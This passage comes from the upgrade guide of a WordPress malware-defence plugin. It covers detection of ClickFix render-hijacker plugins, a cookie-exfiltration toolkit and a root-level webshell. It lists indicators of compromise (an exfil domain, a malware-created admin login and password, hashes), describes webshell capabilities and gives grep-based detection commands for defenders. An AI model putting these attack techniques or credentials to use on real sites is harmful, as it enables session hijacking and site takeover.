**Layer 3: cron callback resolution.** For every scheduled hook in `_get_cron_array()`, every registered callback is reflected to its source file via `ReflectionFunction` (closures, function names) or `ReflectionMethod` (`Class::method`, `[object, method]`). The source file is classified:

| Verdict | Meaning |
| --- | --- |
| `safe` | File lives inside `wp-includes`, `wp-admin`, `WP_PLUGIN_DIR`, `wp-content/themes`, or `wp-content/mu-plugins` |
| `malicious_substring` | File path contains a substring from `WPS_Indicators::malicious_cron_hook_substrings()` |
| `known_backdoor_filename` | File basename matches an entry in `WPS_Indicators::secondary_backdoor_filenames()` |
| `missing_file` | The callback was registered against a file that does not currently exist |
| `outside_expected_dirs` | File lives somewhere else (typically `wp-content/uploads/`, `wp-content/cache/`, or `wp-content/languages/`)  this is the dropper hideout case |

How to use the new checks on a possibly-compromised site:

1. Run **Forensics -> Run forensics**. The three new cards render only when at least one finding is present, so a clean site shows nothing new.
2. Work the auto-prepend card first. A `critical` row is the strongest single signal in this release  it points directly at a dropper that runs on every PHP request.
3. Work the cron callback card next. Every `outside_expected_dirs`, `known_backdoor_filename`, or `malicious_substring` row tells you the exact file that fires when WP-cron triggers and the exact hook to remove with `wp cron event delete <hook>`.
4. Work the unknown-base64-options card last. Each `clickfix_js` or `php_payload` row is a campaign whose option name we do not yet have. Inspect the decoded preview, click **Delete now**, and add the option name to your private follow-up list so you can ship it as catalogued data in a future release.

Acceptance criteria:

1. `WPS_Forensics::run()` returns the three new keys: `auto_prepend_anomalies`, `unknown_base64_options`, `cron_callbacks`.
2. `WPS_Indicators::INDICATOR_VERSION` is `1.3.40-1`.
3. `WPS_Remediation_Controller::register_hooks()` registers `wps_delete_unknown_b64`.
4. The Forensics admin tab renders three new cards when their respective finding sets are non-empty.
5. PHP parser fallback passes on all 19 PHP files.
6. The `clickfix_js` classifier correctly flags the decoded payload of every ClickFix sample on file (confirmed by Reflection-based unit test).

## From 1.3.38 to 1.3.39+

Version 1.3.39 adds detection coverage for two further ClickFix render-hijacker variants observed in the wild as `page-seo-toolkit-a937.zip` and `starter-image-guard-e9a2.zip`. Pure indicator-data update plus a small number of gap-fills against tokens that 1.3.37 added in some places but not others. No architectural or behavioural changes. The diagnostics export bundle's `indicator_version` field bumps to `1.3.39-1`.

Both new samples fit the family pattern exactly: fake performance/SEO plugin disguise, single handler class with a hex suffix, base64 payload stored in a per-variant DB option, late-priority `wp_footer` injection that skips administrators, REST/AJAX/cron contexts, role-bearing logged-in users, bots, and visitors carrying the `_cf_verified` or `_wp_perf_ok` dismiss cookie.

| Marker | Page SEO Toolkit (a937) | Starter Image Guard (e9a2) |
| --- | --- | --- |
| Plugin Name disguise | Page SEO Toolkit | Starter Image Guard |
| Author disguise | Page Software | Dev Group |
| Handler class | `Opt_Handler_841e` | `Render_Module_5b7d` |
| Persistence option | `wp_b6786d21cb_cfg` | `wp_a326b31e44_cfg` |
| `wp_footer` priority | 91734 | 91411 |
| File MD5 | `a23f9c0fb1eb85247d0f4a8264bd9c18` | `bb398fb4783c7fc3647a633b51811099` |
| File SHA-256 | `ee4b899d93655e4fc15b6ed8692a25e3b4052a005f85c5460d22a444e4245b9e` | `acf2aaf34ceac250b03c77ab2afa221f3290508b7f876209ab332830d0ae4105` |

Most internal string literals are concatenated with `'.'.` to defeat naive substring grepping, but the option key, handler class, and slug remain literal in source so the indicator catalogue still matches.

What 1.3.39 catches that 1.3.38 missed:

1. ZIP uploads of any folder named `page-seo-toolkit[-_]<3-8 chars>/` or `starter-image-guard[-_]<3-8 chars>/` are rejected by the upload guard's pattern matcher.
2. The exact sample file MD5 / SHA-256 pairs are in the blocker's hash list, so re-upload of either build is blocked at content-inspection time even if renamed.
3. Scans against existing on-disk PHP files match `page-seo-toolkit`, `starter-image-guard`, `Page SEO Toolkit`, `Starter Image Guard`, `Opt_Handler_841e`, `Render_Module_5b7d`, `wp_b6786d21cb_cfg`, or `wp_a326b31e44_cfg` as content signatures.
4. Forensics' DB anomaly card surfaces `wp_b6786d21cb_cfg` and `wp_a326b31e44_cfg` if either is present in `wp_options`.
5. The wp-config.php cleaner regex removes any line carrying the new markers.
6. The `.htaccess` `perf_analytics` rule block now also denies HTTP access to renamed folders of `page-seo-toolkit`, `starter-image-guard`, and `advanced-asset-insights` (the last was a gap-fill missed in 1.3.37).
7. Forensics media-uploads, SSH grep commands, and Diagnostics Source Trace terms all pick up the two new slugs.

After upgrading on a possibly-compromised site:

1. Run a forced scan from **Overview**.
2. Open **Forensics -> Run forensics**. If `wp_b6786d21cb_cfg` or `wp_a326b31e44_cfg` is in the database, it appears in the DB-anomalies card with a Delete-now button.
3. **Remediation -> Delete malicious DB options** removes either option in one click (both are in the indicator-keyed allowlist).
4. If a scan finds files inside `wp-content/plugins/page-seo-toolkit-XXXX/` or `wp-content/plugins/starter-image-guard-XXXX/`, the auto-remediator deletes the folder when "Auto-delete confirmed malware" is enabled.
5. **Hardening -> Apply ClickFix folder block** (or re-apply if already on) writes the updated `.htaccess` rule block.
6. Then run **Hardening -> Regenerate auth salts** for completeness.

Acceptance criteria:

1. `class-blocker.php` blocked-slugs list contains `page-seo-toolkit` and `starter-image-guard`; pattern list contains the matching `[-_]<suffix>` regexes for both.
2. `class-blocker.php` hash list contains `a23f9c0fb1eb85247d0f4a8264bd9c18`, `ee4b899d93655e4fc15b6ed8692a25e3b4052a005f85c5460d22a444e4245b9e`, `bb398fb4783c7fc3647a633b51811099`, and `acf2aaf34ceac250b03c77ab2afa221f3290508b7f876209ab332830d0ae4105`.
3. `WPS_Indicators::malware_option_keys()` contains `wp_b6786d21cb_cfg` and `wp_a326b31e44_cfg`. `INDICATOR_VERSION` is `1.3.39-1`.
4. `class-scanner.php` `SIGNATURES_PERF` contains `page-seo-toolkit`, `starter-image-guard`, `wp_b6786d21cb_cfg`, `wp_a326b31e44_cfg`, `Opt_Handler_841e`, `Render_Module_5b7d`, `Page SEO Toolkit`, and `Starter Image Guard`.
5. `class-blocker.php` `find_malicious_marker()` signatures cover all of the above plus the gap-filled `wp_fe99c06901_cfg`, `DB_Handler_5dfe`, `Advanced Asset Insights`, and `advanced-asset-insights` tokens.
6. `class-hardening.php` `perf_analytics` `.htaccess` rule block has `RewriteRule` lines for `advanced-asset-insights`, `page-seo-toolkit`, and `starter-image-guard` in addition to the existing five.
7. PHP parser fallback passes on all 17 PHP files; `tools/verify-package.ps1` reports `ALL CHECKS PASS`.

## From 1.3.36 to 1.3.37+

Version 1.3.37 adds detection coverage for a new ClickFix render-hijacker variant observed in the wild as `advanced-asset-insights-ec06.zip`. Pure indicator-data update; no architectural or behavioural changes. The diagnostics export bundle's `indicator_version` field bumps to `1.3.37-1`.

The new sample fits the family pattern exactly: fake performance plugin disguise ("Advanced Asset Insights" / "Cache Team"), single handler class (`DB_Handler_5dfe`), base64 payload stored in a DB option (`wp_fe99c06901_cfg`), late-priority `wp_footer` injection that skips administrators, REST/AJAX/cron contexts, role-bearing logged-in users, bots, and visitors carrying the `_cf_verified` or `_wp_perf_ok` dismiss cookie. Most internal string literals are concatenated with `'.'.` to defeat naive substring grepping, but the option key, handler class, and slug remain literal in source so the indicator catalogue still matches.

What 1.3.37 catches that 1.3.36 missed:

1. ZIP uploads of any folder named `advanced-asset-insights[-_]<3-8 chars>/` are rejected by the upload guard's pattern matcher.
2. The exact sample file MD5 / SHA-256 are in the blocker's hash list, so re-upload of this build is blocked at content-inspection time even if renamed.
3. Scans against existing on-disk PHP files match `advanced-asset-insights`, `Advanced Asset Insights`, `DB_Handler_5dfe`, or `wp_fe99c06901_cfg` as content signatures.
4. Forensics' DB anomaly card surfaces `wp_fe99c06901_cfg` if present in `wp_options`.
5. The wp-config.php cleaner regex removes any line carrying the new markers.

After upgrading on a possibly-compromised site:

1. Run a forced scan from **Overview**.
2. Open **Forensics -> Run forensics**. If `wp_fe99c06901_cfg` is in the database, it appears in the DB-anomalies card with a Delete-now button.
3. **Remediation -> Delete malicious DB options** removes the option in one click (it is in the indicator-keyed allowlist).
4. If a scan finds files inside `wp-content/plugins/advanced-asset-insights-XXXX/`, the auto-remediator deletes the folder when "Auto-delete confirmed malware" is enabled.
5. Then run **Hardening -> Regenerate auth salts** for completeness.

Acceptance criteria:

1. `class-blocker.php` blocked-slugs list contains `advanced-asset-insights`; pattern list contains the matching `[-_]<suffix>` regexes.
2. `class-blocker.php` hash list contains `7dbc51fa960a74a79bd2cb475a2dfd04` and `ff96b828b345755c728cebbf3fc041290f14f12a535f693d06b520d89d106e3b`.
3. `WPS_Indicators::malware_option_keys()` contains `wp_fe99c06901_cfg`. `INDICATOR_VERSION` is `1.3.37-1`.
4. `class-scanner.php` `SIGNATURES_PERF` contains `advanced-asset-insights`, `wp_fe99c06901_cfg`, `DB_Handler_5dfe`, and `Advanced Asset Insights`.
5. PHP parser fallback passes on all 17 PHP files; `tools/verify-package.ps1` reports `ALL CHECKS PASS`.

## From 1.3.35 to 1.3.36+

Version 1.3.36 closes a long-standing scanner gap and adds detection for a third confirmed campaign: a standalone PHP file manager / webshell observed in the field as `wp-default.php`. This campaign is independent of the ClickFix RAT family and the `.sbs` cookie-exfil toolkit  it shares no markers, no infrastructure, and no TTPs. It's the operator's manual hands-on-keyboard interface, used to drop other payloads, edit core files, and (critically) timestomp files to confuse forensics.

What the new sample does:

1. Hardcoded login credentials in source (`admin` / `adminpass`).
2. Custom session cookie `UMSESSID`  separate from WordPress, so regenerating WP auth salts does not log the operator out of this webshell.
3. Full filesystem access at DOCUMENT_ROOT scope via a built-in file manager UI: upload (10 MiB cap), download, mkdir, newfile, rename, delete (recursive), edit-and-save any file, plus a deliberate `setmtime` action that lets the operator set arbitrary modification times on any file. Pure forensic evasion.
4. Self-tag prefix `UM_` / `um_` (probably "Universal Manager" or attacker tag).
5. Default redirect target is `site-file-manager.php`  the file is shipped renamed.

Coverage gap closed:

The other scanner walkers cover descendants of `wp-content/` (plugins, themes, mu-plugins, uploads, languages, cache) and a small set of specific named files at ABSPATH root (`wp-config.php`, `wp-cron.php`, `wp-login.php`, `wordfence-waf.php`). No walker was scanning generic PHP files at ABSPATH root for malware signatures. `wp-default.php` exploits exactly that gap: it lives at the WordPress root next to `wp-config.php`, doesn't reference any of the secondary backdoor filenames, and uses standard PHP file APIs (`file_get_contents`, `file_put_contents`, `move_uploaded_file`, `unlink`, `rename`) so it doesn't trip the high-risk content gate either.

1.3.36 closes the gap with a new scanner check `check_root_file_signatures()` that walks `ABSPATH` non-recursively and runs every PHP file at WordPress root through the full `SIGNATURES_PERF` / `SIGNATURES_ANTY` / `SIGNATURES_BACKDOOR` content matcher. Plus:

1. The exact `wp-default.php` filename is added to `WPS_Indicators::secondary_backdoor_filenames()`, so `check_auto_prepend_hijack` flags the file by basename when present at ABSPATH (works without reading the file).
2. The confirmed sample's MD5 and SHA-256 hashes go into the blocker's hash list, rejecting ZIP uploads of this exact build at the upload guard.
3. Two distinctive content signatures (`UM_AUTO_ROOT_MODE`, `UMSESSID`) are added to `SIGNATURES_BACKDOOR`. Both are unique enough that a single hit confirms the file is a copy or rename of this webshell.

Important caveat for operators dealing with an active compromise:

The `setmtime` action means file modification times on disk may have been altered  not just for the webshell itself but for any file the webshell has touched. Forensic timelines that rely on "files modified after wp-config" or "files modified within an attack window" should be treated as **untrustworthy** until you have verifiably removed the webshell and established a fresh mtime baseline. The "PHP files modified more recently than wp-config.php" Forensics card is still useful for identifying *which* files were touched, but you cannot trust the *when* if this webshell was ever present.

After upgrading on a possibly-compromised site:

1. Find the file by exact name and by content fingerprint:
   ```
   find /home/<user>/public_html -type f -name 'wp-default.php' 2>/dev/null
   grep -lrE 'UM_AUTO_ROOT_MODE|UMSESSID|um_rmdir_recursive' /home/<user>/public_html 2>/dev/null
   ```
2. Delete every match (it's a single self-contained PHP file; deletion is the cleanup).
3. Wipe PHP session storage so any active `UMSESSID` cookie becomes useless. Find your session save path with `php -i | grep session.save_path` and clear its contents.
4. Run a forced scan from **Overview**. The new `check_root_file_signatures()` will report any remaining hits at WordPress root.
5. Run **Hardening -> Regenerate auth salts** for completeness.

Acceptance criteria for 1.3.36:

1. The sample MD5 `8a92828554a087c46cc21c87fd1b15d4` and SHA-256 are present in `class-blocker.php`'s hash list.
2. `WPS_Indicators::secondary_backdoor_filenames()` contains `wp-default.php`.
3. `class-scanner.php`'s `SIGNATURES_BACKDOOR` contains `UM_AUTO_ROOT_MODE` and `UMSESSID`.
4. `WPS_Scanner::check_root_file_signatures()` is defined and is called from the run-pipeline aggregation.
5. `WPS_Indicators::INDICATOR_VERSION` is `1.3.36-1`.
6. PHP parser fallback passes on all 17 PHP files; `tools/verify-package.ps1` reports `ALL CHECKS PASS`.

## From 1.3.34 to 1.3.35+

Version 1.3.35 reorganises the admin UI so destructive buttons live next to the data they act on, and so the tab dependency order matches the natural incident-response workflow. No detection logic, scanner check, AJAX action, or DOM ID changed. The release is a UI/IA polish over 1.3.34's malware-detection content.

What changed:

1. **Tab order**: Forensics is now tab 2 and Diagnostics is tab 3. Source Trace on Diagnostics requires a Forensics report to populate; the previous order put Diagnostics before Forensics, which made the dependency backwards. Tab slugs and aliases are unchanged, so existing bookmarks and `?tab=diagnostics` / `?tab=analytics` URLs continue to resolve.

2. **Diagnostics tab** absorbed three sections from elsewhere:
   - **Diagnostics export** (the redacted JSON support-bundle download) moved here from Settings. Its name already said "Diagnostics".
   - **Clear hostile IP blocks** button moved here from Settings, sitting directly under the Active hostile IP blocks table. It only renders when the list is non-empty.
   - **Environment checks** grid (formerly "System readiness" on Overview) moved here as a final subsection. It's technical info that fits the Diagnostics character.

3. **Hardening tab** Section 2 now contains the **Reset wp-config.php baseline** button (moved from Settings), inside the wp-config.php hardening card next to the constants. The three info-only sections from 1.3.34 (the activation-blocker status card, the ongoing-monitoring bullet list, and the root-cause reminder) are gone from the UI; their content is preserved in this document under the Roadmap and Recovery sections.

4. **Settings tab** is configuration-only now: extra blocked slugs, blocked file hashes, the three behaviour toggles (auto-remediation, hostile IP auto-blocking, ZIP upload pathway guard), and the Save button. The "Danger zone" section was removed; its three buttons moved to where their data lives.

5. **Overview tab** dropped the System readiness grid. It's now focused on scan status, the findings panel, the run-scan button, and recent events.

6. **Hardening section numbering** reflects the trimmed structure:
   - Section 1: Immediate cleanup (transients, sessions)
   - Section 2: wp-config.php hardening (constants, baseline reset)
   - Section 3: .htaccess hardening
   - Section 4: Auth salt rotation

After upgrading:

1. Existing bookmarks to specific tabs continue to work; the URLs are slug-based, not positional.
2. If you scripted any external action against a button id, no ids changed in this release. The buttons just live on different tabs.
3. The plugin's static parser fallback continues to pass on all 17 PHP files; `tools/verify-package.ps1` continues to report `ALL CHECKS PASS`.

Acceptance criteria for 1.3.35:

1. Tab order shows Overview, Forensics, Diagnostics, Remediation, Hardening, Events, Settings.
2. Settings tab has only the configuration form. No buttons other than Save.
3. Diagnostics export, Clear hostile IP blocks, and the environment checks all render on the Diagnostics tab.
4. Reset wp-config baseline renders inside the Hardening Section 2 (wp-config.php) card.
5. PHP parser fallback passes on all 17 PHP files.

## Removed informational content (was Hardening Sections 2 / 6 / Root cause)

These three blocks were UI-only in 1.3.34 and previously rendered on the Hardening tab. They are documentation, not actions, so they belong in the upgrading guide rather than the admin tab.

### Plugin activation blocker (always-on)

The WPS activation blocker is active as long as WP Perf Shield is installed. It catches plugin activation via the admin UI, WP-CLI bulk activation, direct `active_plugins` DB writes, plugins already in the active list at boot time, and new variants uploaded via file-manager exploits. There is nothing for the operator to enable or disable; the protection runs automatically.

### Ongoing monitoring summary

Plugin-level (this plugin):

- Hourly scanner with email alert on critical findings
- wp-config.php hash monitor flags any modification
- WordPress core file integrity check via api.wordpress.org checksum API
- Activation blocker for all known malware slugs
- Inner-ZIP malware inspection for renamed upload attempts
- Hostile IP auto-blocking after confirmed malware upload attempts
- Forensic report: timestamps, admin accounts, theme tampering

Server-level (manual / hosting panel):

- `chmod 555 wp-content/plugins` makes the directory read-only for the web server (WP-CLI required for updates while this is in place)
- `inotifywait` or a host file integrity monitor on `wp-content/plugins/`
- WAF (Cloudflare, Sucuri, or nginx ModSecurity) to block outbound Polygon RPC and `.sbs` C2 connections
- Restrict `wp-login.php` to your IP via `.htaccess` if you have a static IP

### Root cause reminder (recovery context)

The `wp-file-manager` / `wp-file-manager-pro` plugin is the almost-certain upload vector for the malware families this plugin defends against; it has had critical unauthenticated RCE vulnerabilities. Remove or update it as your first action if still present on a compromised site.

## From 1.3.33 to 1.3.34+

Version 1.3.34 closes a specific persistence-mechanism detection gap discovered in incident response: the `.sbs` cookie-exfil toolkit can be loaded on every PHP request via PHP's `auto_prepend_file` directive, typically by injecting an `include_once` line into `ABSPATH/wordfence-waf.php` above the genuine Wordfence WAF bootstrap. Before 1.3.34, the scanner did not look at `wordfence-waf.php`, did not parse `.user.ini` or `.htaccess` for `auto_prepend_file`, and did not scan ABSPATH-root PHP files for substring references to known toolkit filenames. 1.3.34 adds all three.

How the new check works:

1. If `ABSPATH/wordfence-waf.php` exists, the scanner reads it and parses every `include`, `include_once`, `require`, and `require_once` statement. The genuine Wordfence WAF only includes `wp-content/plugins/wordfence/waf/bootstrap.php` (or the `wordfence-protect` premium variant). Anything else is flagged `critical`.
2. If `ABSPATH/.user.ini` or `ABSPATH/.htaccess` exists, the scanner reads it and looks for `auto_prepend_file` directives (including `php_value` / `php_admin_value` forms). Allowed values: empty, `none`, or a path whose basename is `wordfence-waf.php`. Any other value, or any path that resolves outside the WordPress tree, is flagged `critical`.
3. Every non-`wp-config.php` PHP file at the ABSPATH root is read once and substring-scanned for the names returned by `WPS_Indicators::secondary_backdoor_filenames()` (the `.sbs` toolkit filenames added in 1.3.33). Any match is flagged `critical`. This catches the case where the malicious include is dropped into `wp-load.php` or another root-level WordPress file rather than `wordfence-waf.php`.

After upgrading:

1. Run a forced scan from **Overview**. If your `wordfence-waf.php` was hijacked, you will see one or more new critical findings tagged `wordfence-waf.php auto_prepend hijack: non-canonical include` with the offending include target in the subject.
2. If a finding fires, edit the affected file manually (the action message tells you which one). Remove only the malicious include line; leave the canonical Wordfence bootstrap line in place. Then run **Hardening -> Regenerate auth salts** to invalidate any session cookies the prepend has already exfiltrated.
3. Confirm there is no second `auto_prepend_file` setting elsewhere: check your hosting panel for a custom php.ini, check `php -i | grep auto_prepend_file` if you have shell access, and check `.user.ini` and `.htaccess` even if the scanner already cleared them (the scanner reads ABSPATH; subdir overrides are possible).

Acceptance criteria for 1.3.34:

1. The new check fires on a wordfence-waf.php that includes any of the three `.sbs` toolkit filenames returned by `WPS_Indicators::secondary_backdoor_filenames()`.
2. The new check fires on a `.user.ini` or `.htaccess` whose `auto_prepend_file` value is not `wordfence-waf.php` and is not empty.
3. The new check fires on any non-`wp-config.php` PHP file at ABSPATH root that contains a `.sbs` toolkit filename.
4. PHP syntax/parser checks pass on all 17 PHP files; `tools/verify-package.ps1` reports `ALL CHECKS PASS`.

## From 1.3.32 to 1.3.33+

Version 1.3.33 is an indicator-data update covering two newly analysed malware samples. No architectural or behavioural changes.

What was confirmed:

1. **`wp-locale-handler.zip` (variant)** is a content rebuild of the existing ClickFix RAT family. Same `?_wph=a3f8b2c1d4e5f607` activation token, same five modes (`m=p` arbitrary PHP exec, `m=r` MU-plugin restore from `wp_session_tokens_config`, `m=l` wp-login credential harvester injection, `m=t` theme functions.php injection, `m=h` admin user creation), same exfil sink at `wp-content/uploads/2024/06/Stained_Heart_Red-600x500.png`. The XOR encryption key seed is customised (this build embeds the seed for the fifth victim site), suggesting the attacker tailored the credential cipher per-target. Behavioural detection was already complete in 1.3.32; 1.3.33 adds the new file MD5 (`70358bb32a2cf6fcbfc9edfe2848a579`) and SHA-256 to the upload-guard hash list.
2. **`.wp-config-cache.zip` is a SEPARATE CAMPAIGN** from the ClickFix family, with its own infrastructure and TTPs. Three coordinated files: `.wp-config-cache.php` is a session-cookie exfiltrator that posts every administrator's `wordpress_*` cookies (including `wordpress_logged_in_*`, which alone enables full session hijacking) to `https://webanalytics-cdn.sbs/k`; `wp-security-cache.php` is a persistent admin-account creator that ensures user `a7f3e9b2c4d1e5f6` with password `3f8a2d5c9e1b7h4k` exists with the administrator role on every request; `wp-phpunit.php` is a five-fallback webshell that tries `system`, `shell_exec`, `exec`, `passthru`, and `popen` in order to find any one the host has not disabled.

Coverage gap closed in 1.3.33:

The `.sbs` toolkit shares no markers with the ClickFix family and would have slipped past most of the 1.3.32 scanner. The cookie exfil file does not use any of the high-risk PHP API tripwires (`eval`, `base64_decode`, `shell_exec`, `passthru`, `system`); the persistent admin creator uses only `wp_create_user` plus `set_role`. Only the bare webshell (`wp-phpunit.php`) would have been caught via the existing high-risk-API content gate.

After upgrading to 1.3.33 these specific markers are caught:

1. `webanalytics-cdn.sbs` and `a7f3e9b2c4d1e5f6` in `SIGNATURES_BACKDOOR`. Any PHP file containing either string is flagged on scan. Both are high-entropy strings with zero plausible coincidence rate.
2. The three filenames `.wp-config-cache.php`, `wp-security-cache.php`, `wp-phpunit.php` are added to the wp-content/cache scan and the forensics known-backdoor lists.
3. Eight new file hashes (one MD5+SHA-256 for the ClickFix RAT variant, three MD5+SHA-256 pairs for the `.sbs` toolkit) are added to `class-blocker.php`. Renamed-ZIP uploads of any of these files are rejected at the upload guard.
4. The username `a7f3e9b2c4d1e5f6` is added to the malware-created admin login list. Forensics will flag this account as confirmed malware-created and offer Delete account on the row.
5. The wp-config.php cleaner regex includes `webanalytics-cdn.sbs` and `a7f3e9b2c4d1e5f6` so any line containing these in wp-config.php is removed by **Remediation -> Clean wp-config.php**.

After upgrading on a possibly-compromised site:

1. Run a forced scan from **Overview**. Any of the three `.sbs` toolkit files on disk should now be reported.
2. Open **Forensics** and confirm:
   - Admin accounts table flags `a7f3e9b2c4d1e5f6` as `Known malware-created` if present, with a Delete button.
   - Database anomaly cards do not list anything new (this campaign uses no DB persistence options; the ClickFix family options remain in scope and are listed if present).
3. Open **Remediation -> Clean wp-config.php** if the dashboard reports a wp-config.php hash mismatch; the cleaner now removes any line containing the `.sbs` campaign markers.
4. Rotate every admin password and run **Hardening -> Regenerate auth salts**. The cookie exfiltrator may have already copied valid session tokens; rotating salts invalidates every issued cookie immediately.
5. Search server outbound logs for `webanalytics-cdn.sbs` to estimate how long the cookie exfil has been running before WPS detected it.

Acceptance criteria for 1.3.33:

1. The two confirmed file hashes for the new ClickFix RAT variant and the six confirmed hashes for the `.sbs` toolkit appear in the `class-blocker.php` blocked-hashes list.
2. `WPS_Indicators::INDICATOR_VERSION` reads `1.3.33-1` and the diagnostics export bundle reflects the bump.
3. `tools/verify-package.ps1` reports `ALL CHECKS PASS`.
4. The release ZIP has `wp-perf-shield/` as a single root, all 26 required entries present, no stray docs or `tools/` content.

## From 1.3.31 to 1.3.32+

Version 1.3.32 fixes an administrator lockout that could occur when the operator's own IP landed in the hostile-IP auto-block list. The most common trigger is the operator uploading a malformed WP Perf Shield release ZIP (for example, one packaged with PowerShell `Compress-Archive`, which writes Windows backslash entry paths that fail the self-package exemption check). It can also happen on any shared egress IP where another request from that IP triggered an upload block first.

Before 1.3.32, every request from a blocked IP was killed with a 403 at `init` priority 0  including admin requests from the locked-out operator. The "Clear hostile IP blocks" button in **Settings -> Danger Zone** could not be reached without out-of-band recovery (WP-CLI, direct DB access, or SFTP-renaming the plugin folder).

What 1.3.32 changes:

1. `WPS_Blocker::maybe_block_request()` now checks `is_user_logged_in() && current_user_can( 'manage_options' )` before issuing `wp_die()`. When that condition is true, the request is allowed through and a recovery banner is registered on `admin_notices` + `network_admin_notices`. The events log records a new `self_block_bypassed` event the first time per IP per hour.
2. The recovery banner (`WPS_Blocker::render_self_block_notice()`) appears at the top of every admin page until the block list is cleared. It carries a one-click **Clear hostile IP blocks now** button that calls the existing `wps_clear_ip_blocks` AJAX action and reloads the page on success, plus a link to **Settings -> Danger Zone** for operators who prefer to use the existing UI.
3. The JavaScript that drives the banner is inlined in the notice itself, not in `assets/js/admin.js`. This is intentional: the admin asset is enqueued only on the WP Perf Shield admin screen, but the banner must work on every admin page where the operator may land first (Dashboard, Tools, Plugins, etc.).

What 1.3.32 does NOT change:

1. Unauthenticated requests from a blocked IP are still rejected with a 403. The auto-block targets unauthenticated upload scripts, which remain blocked.
2. `wp-login.php` from a blocked IP is still rejected. The bypass requires an existing authenticated session; brute-force defence on the login form is unchanged.
3. The set of triggers for adding an IP to the block list is unchanged. ZIP upload guards, indicator content scans, and the self-package exemption all behave exactly as before.

After upgrading:

1. If you are currently locked out from your own admin (a blank "Request blocked by WP Perf Shield" page on every URL), you still need an out-of-band recovery once: run `wp option delete wps_blocked_ips` via WP-CLI, or `DELETE FROM wp_options WHERE option_name = 'wps_blocked_ips';` via phpMyAdmin, or rename `wp-content/plugins/wp-perf-shield/` to disable the plugin temporarily. After that one recovery, log in normally; if your IP is re-added to the block list later (for any reason) you will see the recovery banner instead of being locked out.
2. After 1.3.32 is installed and you are logged in, future self-blocks surface the banner at the top of admin pages. Click **Clear hostile IP blocks now** to recover in place. The events log records `self_block_bypassed` so support can see in the timeline that an admin self-block happened.
3. Test by enabling **Auto-block IPs that attempt known malware uploads** in Settings, then deliberately upload a known-bad ZIP through Plugins -> Add New from a separate browser session. Your admin browser's session should remain usable; the recovery banner should appear at the top of the next admin page you load.

Acceptance criteria:

1. A logged-in administrator with `manage_options` is not locked out of admin when their IP is in the hostile-IP auto-block list.
2. Unauthenticated requests from the same IP are still rejected with a 403.
3. `wp-login.php` from a blocked IP is still rejected with a 403.
4. The recovery banner button calls `wps_clear_ip_blocks` (no new AJAX action introduced) and reloads the page on success.
5. PHP syntax/parser checks pass on all 17 PHP files; `tools/verify-package.ps1` reports `ALL CHECKS PASS`.

## From 1.3.30 to 1.3.31+

Version 1.3.31 implements Phase 4 (indicator data split  conservative scope) and Phase 5 (diagnostics export, smoke-test checklist, package verification script) from the controlled development roadmap. The release closes out the roadmap.

What changed structurally:

1. New file `includes/class-wps-indicators.php` defines a `WPS_Indicators` class exposing four static indicator loaders: `malware_option_keys()`, `mu_persistence_option_keys()`, `exfil_filenames()`, and `malicious_cron_hook_substrings()`. The class also exposes `INDICATOR_VERSION` so a downstream parity test can detect drift. Hash lists, suffix patterns, and PCRE catalogues that are tightly coupled to specific scanner or hardening logic intentionally stay in their owning class until a parity-test harness exists.
2. The duplicate hard-coded arrays in the remediation controller, forensics class, and scanner class were replaced with calls to the shared loader. Indicator values are unchanged in this release; only the storage location moved.
3. New AJAX handler `wps_export_diagnostics` (capability `manage_options`) returns a redacted JSON support bundle. The Settings tab carries a new "Diagnostics export" panel with a `wps-export-diag-btn` button; clicking it triggers a browser download of the bundle. Nothing is sent off-site.
4. New "Manual Smoke-Test Checklist" section in `doc/upgrading.md` (above) is the operator checklist for staging validation. New file `tools/verify-package.ps1` is the pre-release script that codifies the parser fallback used through Phases 0-5.

Diagnostics export contents and redaction:

The bundle includes `plugin_version`, `indicator_version`, WP and PHP versions, settings counts (not raw slug/hash content), active protections, environment checks, last scan summary, redacted findings (subject and match truncated to 200 chars), blocked IP summaries, the most recent 50 events with subjects truncated to 240 chars, and a forensics summary if cached. `exfil_file_read` event rows are explicitly dropped. Raw credentials, auth salts, DB passwords, and full exfil contents are never included. The handler logs a `diagnostics_exported` event for audit.

After upgrading:

1. Open **Tools -> WP Perf Shield -> Settings** and confirm a new **Diagnostics export** panel sits below the Danger zone.
2. Click **Download support bundle (JSON)**. Confirm a file named `wp-perf-shield-diagnostics-1.3.31-...-UTC.json` downloads. Open it and confirm `plugin_version`, `indicator_version`, and the redacted sections look right.
3. From the repo root, run `pwsh tools/verify-package.ps1` (or `powershell -ExecutionPolicy Bypass -File tools/verify-package.ps1`). Every check must report OK. The script is intended to run as the last step before building a release ZIP.
4. Optionally, walk through the **Manual Smoke-Test Checklist** above on a staging site for full Phase 1-5 acceptance coverage.

Acceptance criteria for Phase 4:

1. Existing confirmed malware samples are still detected. Indicator values were preserved byte-for-byte during the move; the parser fallback confirms balanced PHP across all 18 source files.
2. WP Perf Shield release ZIP self-exemption still works. The self-package check in `class-blocker.php` was not touched.
3. Known benign local-owner strings are not reintroduced as attacker-account or malware signatures. The 1.3.25 fix that removed `bismikaallahuma` is unchanged.
4. Indicator files are included in the release ZIP under `wp-perf-shield/`. `tools/verify-package.ps1` checks the layout and refuses to pass if `includes/class-wps-indicators.php` is missing.

Acceptance criteria for Phase 5:

1. A support bundle can be generated without exposing secrets. The redaction policy is documented above; runtime validation is part of the Manual Smoke-Test Checklist section I.
2. The release process can verify syntax, docs placement, version markers, and ZIP root. `tools/verify-package.ps1` runs all four checks and exits non-zero on any failure.
3. The smoke-test checklist covers plugin upload, malware ZIP block, scan, auto-delete, detect-only, hardening, forensics, events, and settings. See the Manual Smoke-Test Checklist sections A through K.

### Phase 4 + 5 file map

| File | Phase | Role |
|---|---|---|
| `includes/class-wps-indicators.php` | 4 | Versioned malware indicator data (option keys, exfil filenames, cron hook substrings) |
| `includes/class-remediation-controller.php` | 5 | New `export_diagnostics()` static method with redaction helpers |
| `includes/class-admin-settings.php` | 5 | New "Diagnostics export" panel below Danger zone |
| `assets/js/admin.js` | 5 | New `#wps-export-diag-btn` click handler that triggers a Blob download |
| `doc/upgrading.md` | 5 | New "Manual Smoke-Test Checklist" section (sections A-K) for operator-facing manual validation |
| `tools/verify-package.ps1` | 5 | Pre-release validation script (parser fallback, version markers, layout check) |
| `doc/ssot.md` | 4+5 | Documents the indicator class and verification script |

### Roadmap status after 1.3.31

| Phase | Status |
|---|---|
| Phase 0  Baseline and guardrails | Closed in 1.3.27 (development-only verification). |
| Phase 1  Safety stabilization | Closed in 1.3.28. Shared guard helpers, tightened caps, wp_unslash consistency, post-write sanity checks, distinct log labels, exfil redaction. |
